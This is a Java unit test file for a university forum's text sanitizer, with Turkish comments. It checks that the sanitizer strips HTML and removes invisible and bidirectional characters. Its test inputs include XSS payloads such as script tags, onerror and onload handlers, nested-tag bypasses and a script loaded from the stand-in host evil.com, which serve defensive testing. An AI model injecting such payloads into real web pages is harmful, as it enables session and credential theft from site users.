package edu.bingol.backend.forum.moderation;

import static org.assertj.core.api.Assertions.assertThat;

import edu.bingol.backend.forum.moderation.spi.ForumTextSanitizer;
import org.junit.jupiter.api.Test;

/** XSS / HTML enjeksiyonu / gorunmez karakter / bosluk temizligi (saf fonksiyon testi). */
class ForumTextSanitizerTest {

    private static final String ZWSP = String.valueOf((char) 0x200B);
    private static final String ZWJ = String.valueOf((char) 0x200D);
    private static final String NUL = String.valueOf((char) 0);
    private static final String RLO = String.valueOf((char) 0x202E);
    private static final String PDF = String.valueOf((char) 0x202C);

    @Test
    void scriptBlockIsRemovedWithContent() {
        assertThat(ForumTextSanitizer.multiLine("merhaba <script>alert(1)</script> dunya")).isEqualTo("merhaba dunya");
        assertThat(ForumTextSanitizer.multiLine("<SCRIPT SRC=//evil.com/x.js></SCRIPT>selam")).isEqualTo("selam");
        assertThat(ForumTextSanitizer.multiLine("x <script>alert(1)")).isEqualTo("x");
        assertThat(ForumTextSanitizer.multiLine("<style>body{display:none}</style>ok")).isEqualTo("ok");
    }

    @Test
    void eventHandlerAttributesAndTagsAreRemoved() {
        assertThat(ForumTextSanitizer.multiLine("<img src=x onerror=alert(1)>resim")).isEqualTo("resim");
        assertThat(ForumTextSanitizer.multiLine("<a href=\"javascript:alert(1)\" onclick=\"x()\">tikla</a>")).isEqualTo("tikla");
        assertThat(ForumTextSanitizer.multiLine("<svg/onload=alert(1)>t")).isEqualTo("t");
        assertThat(ForumTextSanitizer.multiLine("<iframe src=//x></iframe>y")).isEqualTo("y");
    }

    @Test
    void nestedTagTricksDoNotSurvive() {
        String out = ForumTextSanitizer.multiLine("<scr<script>ipt>alert(1)</scr</script>ipt>");
        assertThat(out.toLowerCase()).doesNotContain("<script").doesNotContain("</script");
        assertThat(ForumTextSanitizer.multiLine("<<b>img src=x onerror=alert(1)>")).doesNotContain("onerror=alert(1)>");
        // etiketin icine gizlenen NUL / sifir genislik
        assertThat(ForumTextSanitizer.multiLine("<scr" + NUL + "ipt>alert(1)</scr" + ZWSP + "ipt>")).doesNotContainIgnoringCase("<script");
    }

    @Test
    void javascriptLinkTextStaysPlainText() {
        assertThat(ForumTextSanitizer.multiLine("javascript:alert(1)")).isEqualTo("javascript:alert(1)");
        assertThat(ForumTextSanitizer.multiLine("bak: https://bingol.edu.tr/duyuru")).isEqualTo("bak: https://bingol.edu.tr/duyuru");
    }

    @Test
    void lonelyAngleBracketsAreKept() {
        assertThat(ForumTextSanitizer.multiLine("a < b ve c > d")).isEqualTo("a < b ve c > d");
        assertThat(ForumTextSanitizer.multiLine("seni seviyorum <3")).isEqualTo("seni seviyorum <3");
    }

    @Test
    void controlAndInvisibleCharactersAreRemoved() {
        assertThat(ForumTextSanitizer.singleLine("a" + NUL + "b" + (char) 7 + "c")).isEqualTo("abc");
        assertThat(ForumTextSanitizer.singleLine("ya" + ZWSP + "zi" + (char) 0x2060 + "li" + (char) 0xFEFF + "m")).isEqualTo("yazilim");
        // iki yonlu metin degistirme (Trojan source)
        assertThat(ForumTextSanitizer.singleLine("abc" + RLO + "def" + PDF)).isEqualTo("abcdef");
        assertThat(ForumTextSanitizer.singleLine("a" + (char) 0x2066 + "b" + (char) 0x2069)).isEqualTo("ab");
        // ZWJ iki ASCII arasinda silinir, emoji dizisinde korunur
        assertThat(ForumTextSanitizer.singleLine("a" + ZWJ + "b")).isEqualTo("ab");
        String family = new String(Character.toChars(0x1F468)) + ZWJ + new String(Character.toChars(0x1F469))
                + ZWJ + new String(Character.toChars(0x1F467));
        assertThat(ForumTextSanitizer.singleLine(family)).isEqualTo(family);
    }

    @Test
    void whitespaceIsCollapsed() {
        assertThat(ForumTextSanitizer.multiLine("  a   b\t\tc  ")).isEqualTo("a b c");
        assertThat(ForumTextSanitizer.multiLine("bir\r\n\r\n\r\n\r\nikinci  \nuc")).isEqualTo("bir\n\nikinci\nuc");
        assertThat(ForumTextSanitizer.singleLine("baslik\nikinci satir\r\nuc")).isEqualTo("baslik ikinci satir uc");
    }

    @Test
    void blankInputsBecomeEmpty() {
        assertThat(ForumTextSanitizer.isBlank(ForumTextSanitizer.multiLine("   \n\t " + ZWSP + " "))).isTrue();
        assertThat(ForumTextSanitizer.isBlank(ForumTextSanitizer.multiLine("<b></b>"))).isTrue();
        assertThat(ForumTextSanitizer.multiLine(null)).isNull();
        assertThat(ForumTextSanitizer.isBlank(null)).isTrue();
    }

    @Test
    void turkishAndArabicTextIsPreserved() {
        String tr = "Şu çocuğun öğle yemeği İyi miydi? ığüşöç";
        assertThat(ForumTextSanitizer.multiLine(tr)).isEqualTo(tr);
        String ar = "مرحبا بكم في الجامعة";
        assertThat(ForumTextSanitizer.multiLine(ar)).isEqualTo(ar);
    }

    @Test
    void compareKeyIgnoresPunctuationCaseAndInvisibles() {
        assertThat(ForumTextSanitizer.compareKey("Merhaba, Dünya!!"))
                .isEqualTo(ForumTextSanitizer.compareKey("  merhaba" + ZWSP + " dünya "));
        assertThat(ForumTextSanitizer.compareKey("a")).isNotEqualTo(ForumTextSanitizer.compareKey("b"));
        assertThat(ForumTextSanitizer.compareKey(null)).isEmpty();
    }
}
